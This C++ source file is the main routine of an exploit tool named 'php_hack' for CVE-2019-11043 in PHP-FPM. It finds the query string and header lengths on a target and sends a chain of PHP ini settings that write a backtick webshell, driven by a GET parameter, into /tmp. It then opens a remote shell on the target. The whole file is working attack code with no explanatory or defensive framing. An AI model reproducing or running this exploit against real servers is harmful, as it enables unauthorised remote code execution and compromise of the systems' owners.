#include "hdr.h"

int main(int argc, char* argv[]) {
    if (argc != 3) {
        cout << "Usage:" << endl << "php_hack [target] [port]" << endl;
        return 1;
    }

    addrinfo* addr = findHost(argv[1], argv[2]);

    if (addr == NULL) {
        return 1;
    }

    int qsl;
    int hlen;

    vector<string> chain = { "short_open_tag=1", "html_errors=0", "include_path=/tmp", "auto_prepend_file=a", "log_errors=1",
        "error_reporting=2", "error_log=/tmp/a", "extension_dir=%22%3C%3F=%60%22", "extension=%22$_GET%5Ba%5D%60%3F%3E%22" };

    cout << "Finding QSL..." << endl;
    qsl = findQSL(addr, argv[1]);
    if (qsl == -1) {
        cout << "The target is immune to CVE-2019-11043" << endl;
        return 0;
    }
    cout << "Found QSL: " << qsl << endl;

    cout << "Finding header length..." << endl;
    hlen = findHlen(addr, argv[1], qsl);
    if (hlen == -1) {
        cout << "The target is immune to CVE-2019-11043" << endl;
        return 0;
    }
    cout << "Found header length: " << hlen << endl;

    cout << "Gaining access..." << endl;
    sendchain(addr, argv[1], qsl, hlen, chain);

    shell(addr, argv[1]);

    return 1;
}